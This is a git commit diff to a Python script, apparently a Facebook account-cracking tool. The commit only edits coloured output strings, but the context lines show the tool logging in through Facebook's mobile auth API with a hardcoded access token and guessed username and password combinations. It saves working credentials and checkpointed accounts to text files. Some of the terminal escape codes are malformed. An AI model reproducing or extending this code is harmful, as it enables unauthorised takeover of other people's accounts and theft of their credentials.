e2fe89af1bb1628a774ac1e2f60f9f18f006744d
TipuBrand <83490447+TipuBrand@users.noreply.github.com>
2021-08-28 09:21:13 +0500

    Update Brand.py

--- Brand.py
+++ Brand.py
@@ -257,14 +257,14 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m ✓Tipu OK  ✓\x1b[1;92m{\x1b[1;92m\x1b[1;92m}' + k + c + user + '[ \x1b[1;92m\x1b[1;92m] ' + pass1																				
+				print '\x1b[1;92m ✓Tipu OK  ✓ \x1b[1;92m{\x1b[1;92m\x1b[ 1;92m' + k + c + user + ' \x1b[1;92m\x1b[1;92m ] ' + pass1																				
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\x1b[1;95\x1b[1;95m ×Tipu Checkpoint ×\x1b[1;95m{\x1b[1;95m\x1b[1;95m}' + k + c + user + '[\x1b[1;95m\x1b[1;95m]' + pass1
+					print '\x1b[1;95\x1b[1;95m ×Tipu Checkpoint × \x1b[1;95m{ \x1b1;95m\x1b[1;95m} ' + k + c + user + '[\x1b[1;95m\x1b[1;95m]' + pass1
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
